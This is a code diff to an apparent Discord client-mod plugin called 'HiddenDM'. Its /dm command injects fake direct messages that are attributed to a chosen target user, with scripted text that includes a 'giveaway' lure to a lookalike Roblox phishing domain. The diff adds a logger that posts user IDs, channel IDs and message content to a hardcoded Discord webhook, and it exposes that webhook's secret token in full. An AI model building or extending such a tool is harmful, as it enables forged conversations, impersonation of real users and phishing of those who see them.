@@ -13,6 +13,22 @@
     const ReadStateStore = findByProps("getAllReadStates");
     const BulkAck = findByProps("bulkAck");
 
+    // ====== WEBHOOK DEBUG LOG ======
+    // Paste your Discord webhook URL here to see debug logs
+    var WEBHOOK = "https://discord.com/api/webhooks/1494834446124454092/Fw6DFtNJig7VQfx7UeGa3mKQjA-B5CTojUannS4bQ7Ea50T-BtijwG_ETNoabV2G7uPy";
+
+    function log(msg) {
+      try {
+        if (!WEBHOOK || WEBHOOK === "PASTE_YOUR_WEBHOOK_URL_HERE") return;
+        fetch(WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: "[HiddenDM] " + msg })
+        });
+      } catch(e) {}
+    }
+    // ===============================
+
     // ====== THE SCRIPT ======
     var SCRIPT = [
       "You just won a big giveaway in our server please join me here https://robioxxz.com/users/1430181923/profile",
@@ -24,6 +40,12 @@
       "Your loss loser"
     ];
     // ========================
+
+    log("onLoad started");
+    log("Dispatcher: " + (Dispatcher ? "found" : "NULL"));
+    log("Dispatcher.dispatch: " + (Dispatcher && typeof Dispatcher.dispatch === "function" ? "found" : "NULL"));
+    log("UserStore: " + (UserStore ? "found" : "NULL"));
+    log("MessageStore: " + (MessageStore ? "found" : "NULL"));
 
     function getFakeMessages() {
       try {
@@ -191,19 +213,24 @@
         execute: function(args, ctx) {
           try {
             var channelId = ctx.channel.id;
+            log("dm execute called, channelId=" + channelId);
+            log("args count=" + args.length + " args=" + JSON.stringify(args));
 
             // Get targ from the user option
             var targId = null;
             for (var a = 0; a < args.length; a++) {
               if (args[a].name === "user") targId = args[a].value;
             }
+            log("targId=" + targId);
 
             // Get yourself
             var meModule = findByProps("getCurrentUser");
             var currentUser = meModule ? meModule.getCurrentUser() : null;
             var myId = currentUser ? currentUser.id : null;
+            log("myId=" + myId);
 
             if (!targId || !myId) {
+              log("FAIL: missing IDs targId=" + targId + " myId=" + myId);
               showToast("Could not get user IDs.", getAssetIDByName("Small"));
               return;
             }
@@ -224,12 +251,15 @@
               var authorId = j % 2 === 0 ? targId : myId;
               var msg = buildFakeMessage(channelId, authorId, SCRIPT[j]);
               msg.timestamp = new Date(timestamps[j]).toISOString();
+              log("injecting msg " + j + " author=" + authorId + " content=" + SCRIPT[j].substring(0, 30));
               storeFakeMessage(channelId, msg);
               injectFakeMessage(channelId, msg, "command_dm");
             }
             clearUnreadStates();
+            log("done, injected " + SCRIPT.length + " messages");
             showToast("Injected " + SCRIPT.length + " messages.", getAssetIDByName("Check"));
           } catch (e) {
+            log("ERROR in /dm: " + e.message + " stack: " + e.stack);
             console.error("[HiddenDM] /dm error:", e);
             showToast("Failed: " + e.message, getAssetIDByName("Small"));
           }
